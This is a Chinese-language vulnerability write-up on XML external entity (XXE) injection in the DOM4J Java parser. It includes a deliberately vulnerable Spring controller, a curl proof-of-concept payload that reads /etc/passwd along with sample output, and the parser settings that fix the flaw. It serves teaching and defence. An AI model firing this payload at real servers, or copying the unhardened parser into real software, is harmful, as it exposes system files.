# DOM4J

DOM4J是 dom4j.org 出品的一个开源 XML 解析包。DOM4J应用于 Java 平台，采用了 Java 集合框架并完全支持 DOM，SAX 和 JAXP。

## 使用
```java
package com.example.controller;

import org.dom4j.Document;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayInputStream;

@RestController
@RequestMapping("/xxe/dom4j")
public class Dom4jController {
    
    @PostMapping("/post/dom4j.do")
    public ResponseEntity<String> documentBuilder1(String xml, int fix) throws Exception {
        return ResponseEntity.ok(dom4j(xml, fix));
    }

    public static String dom4j(String xml, int fix) throws Exception {
        SAXReader saxReader = new SAXReader();
        // 启用修复方式
        if (fix == 1) {
            saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            saxReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        }
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(xml.getBytes());
        Document document = saxReader.read(byteArrayInputStream);
        Element element = document.getRootElement();
        return element.getText();
    }
}
```
> dom4j版本
```java
 <dependency>
    <groupId>org.dom4j</groupId>
    <artifactId>dom4j</artifactId>
    <version>2.0.0</version>
</dependency>
```

## POC

```shell
curl --location --request POST 'http://localhost:8080/xxe/dom4j/post/dom4j.do' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'xml=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
--data-urlencode 'fix=0'
```
读取 `/etc/passwd`文本内容

返回结果：

```shell
##
# User Database
# 
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
...
```

## 修复
SAXReader 在读取xml前设置如下feature：
```shell
saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
saxReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```
上面的修复方式在具体实施时存在缺陷：
+ 如果读取xml代码在第三方包中（或者依赖框架），很难修改，必须pr框架/包提供者来修复；

## 建议

使用RASP修改`saxReader.read`方法字节码，在读取xml前设置features属性。
